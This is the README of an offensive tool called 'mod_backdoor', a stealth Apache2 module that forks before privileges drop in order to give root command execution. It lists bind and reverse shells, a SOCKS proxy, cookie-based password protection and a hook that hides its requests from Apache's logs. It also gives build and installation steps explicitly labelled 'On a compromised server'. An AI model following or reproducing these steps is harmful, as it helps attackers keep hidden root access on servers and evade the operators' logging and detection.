# Apache2 mod_backdoor
Apache2 Module Backdoor is a stealth backdoor using an Apache2 module.<br/>
The main idea is to fork() the main Apache2 process just after it has readed its config.
Since it's forked before the root user transfer the process to www-data, you can execute command as root.<br/>


Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
More info about Ringbuilder:<br/>
https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>


# Features

* Bind TTY Shell
* Reverse Shell (TTY ,PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns a new forked independent root process
* Socks proxy (Socks5 code from https://github.com/fgssfgss/socks_proxy)
* Password Protection through cookie headers
* Ping module to know if its still active


There is also a hook to bypass the Apache2 logging mechanism. Each request to the backdoor module **are not logged** by Apache2.



# Notes
Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy

# Builds
For developpement :<br/>
* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
 -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Compile it like above and get the mod_backdoor.so
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Create `/etc/apache2/mod-available/backdoor.load` --> <br/>
 `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))
